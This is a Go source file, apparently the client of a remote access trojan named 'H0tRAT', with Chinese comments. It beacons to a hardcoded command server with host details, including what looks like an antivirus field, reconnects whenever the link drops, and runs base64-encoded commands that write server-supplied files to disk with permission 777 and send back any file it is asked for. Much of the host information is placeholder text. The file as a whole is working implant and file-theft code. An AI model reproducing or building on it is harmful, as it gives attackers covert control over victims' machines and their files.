package client

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const (
	IP      = "127.0.0.1:1010"
	PORT    = 1010
	CONNPWD = "18Sd9fkdkf9"
)

const (
	HEAD    = "HEAD"
	VERSION = "1.0.0"
)

var isturn = true

func Ma() {

	connectNew()

}

func heartbeat(conn net.Conn, interval time.Duration) {

	for {
		time.Sleep(interval)
		writer := bufio.NewWriter(conn)
		//创建心跳
		_, err := fmt.Fprintln(writer, -1)
		if err != nil {
			fmt.Println(err)
			//重连
			connectNew()
			return
		}
	}
}

func connectNew() {

	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1010")
	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
	if err != nil {
		fmt.Println(err)
	}
	//defer socket.Close()
	// IO流
	dataOutputStream := bufio.NewWriter(socket)
	dataOutputStream.Flush()

	// 发送信息
	fmt.Fprintln(dataOutputStream, "H0tRAT")
	fmt.Fprintln(dataOutputStream, "USER")
	fmt.Fprintln(dataOutputStream, "HOSTNAME")
	fmt.Fprintln(dataOutputStream, runtime.GOOS)
	fmt.Fprintln(dataOutputStream, IP)
	fmt.Fprintln(dataOutputStream, "测试地址")
	fmt.Fprintln(dataOutputStream, "测试名字")
	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
	fmt.Fprintln(dataOutputStream, "测试")
	fmt.Fprintln(dataOutputStream, VERSION)
	fmt.Fprintln(dataOutputStream, "360")
	//发送心跳防止掉线
	//go heartbeat(socket, time.Second)
	//
	//for {
	//	time.Sleep(time.Second)
	//}

}

func maConnetNew() {
	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1010")
	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
	if err != nil {
		fmt.Println(err)
		maConnetNew()
	}
	defer socket.Close()

	// IO流
	dataOutputStream := bufio.NewWriter(socket)
	defer dataOutputStream.Flush()

	// 发送信息
	fmt.Fprintln(dataOutputStream, "H0tRAT")
	fmt.Fprintln(dataOutputStream, "USER")
	fmt.Fprintln(dataOutputStream, "HOSTNAME")
	fmt.Fprintln(dataOutputStream, runtime.GOOS)
	fmt.Fprintln(dataOutputStream, IP)
	fmt.Fprintln(dataOutputStream, "测试地址")
	fmt.Fprintln(dataOutputStream, "测试名字")
	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
	fmt.Fprintln(dataOutputStream, "测试")
	fmt.Fprintln(dataOutputStream, VERSION)
	fmt.Fprintln(dataOutputStream, "360")

	for {
		// IO流
		message, err := bufio.NewReader(socket).ReadString('\n')
		if err == io.EOF {
			// 如果服务器断开，则重新连接
			socket.Close()
			maConnetNew()
		}
		// 收到指令base64解码
		decodedCase, _ := base64.StdEncoding.DecodeString(message)
		command := string(decodedCase)
		cmdParameter := strings.Split(command, " ")
		switch cmdParameter[0] {
		case "back":
			socket.Close()
			maConnetNew()
		case "exit":
			socket.Close()
			os.Exit(0)

		case "upload":
			uploadOutput, _ := bufio.NewReader(socket).ReadString('\n')
			decodeOutput, _ := base64.StdEncoding.DecodeString(uploadOutput)
			encData, _ := bufio.NewReader(socket).ReadString('\n')
			decData, _ := base64.URLEncoding.DecodeString(encData)
			ioutil.WriteFile(string(decodeOutput), []byte(decData), 777)

		case "download":
			// 第一步收到下载指令,什么都不做，继续等待下载路径
			download, _ := bufio.NewReader(socket).ReadString('\n')
			decodeDownload, _ := base64.StdEncoding.DecodeString(download)
			file, err := ioutil.ReadFile(string(decodeDownload))
			if err != nil {
				// 找不到文件，发送错误消息
				errMsg := base64.URLEncoding.EncodeToString([]byte("[!] File not found!"))
				socket.Write([]byte(string(errMsg) + "\n"))
				break
			}
			//发送一个download指令给服务器端准备接收
			srvDownloadMsg := base64.URLEncoding.EncodeToString([]byte("download"))
			socket.Write([]byte(string(srvDownloadMsg) + "\n"))
			//读文件上传
			encData := base64.URLEncoding.EncodeToString(file)
			socket.Write([]byte(string(encData) + "\n"))

		}
	}
}
